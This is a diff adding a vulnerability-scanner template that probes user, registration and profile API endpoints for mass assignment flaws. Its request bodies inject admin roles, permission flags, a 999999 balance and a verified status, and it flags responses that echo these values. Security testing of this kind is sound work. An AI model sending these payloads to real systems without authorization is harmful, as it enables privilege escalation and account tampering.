@@ -1,0 +1,58 @@
+id: whai-mass-assignment
+
+info:
+  name: Mass Assignment Vulnerability Detection
+  author: whitehat-ai
+  severity: high
+  description: Detects mass assignment vulnerabilities by injecting extra fields in API requests
+  tags: mass-assignment,api,authorization,bfla
+  reference:
+    - https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/user"
+      - "{{BaseURL}}/api/register"
+      - "{{BaseURL}}/api/signup"
+      - "{{BaseURL}}/api/v1/user"
+      - "{{BaseURL}}/api/v1/register"
+    headers:
+      Content-Type: "application/json"
+    body: '{"username":"whaitest","email":"test@whaitest.com","password":"TestPass123!","role":"admin","is_admin":true,"isAdmin":true,"admin":true,"permissions":["admin"]}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(\"role\":\\s*\"admin\"|\"is_admin\":\\s*true|\"isAdmin\":\\s*true|\"admin\":\\s*true)"
+          - "(?i)(\"permissions\".*admin)"
+        condition: or
+
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/user/profile"
+      - "{{BaseURL}}/api/profile"
+      - "{{BaseURL}}/api/me"
+      - "{{BaseURL}}/api/v1/user/profile"
+    headers:
+      Content-Type: "application/json"
+    body: '{"name":"test","role":"admin","is_admin":true,"balance":999999,"credit":999999,"verified":true}'
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(\"role\":\\s*\"admin\"|\"is_admin\":\\s*true|\"balance\":\\s*999999|\"verified\":\\s*true)"
+        condition: or
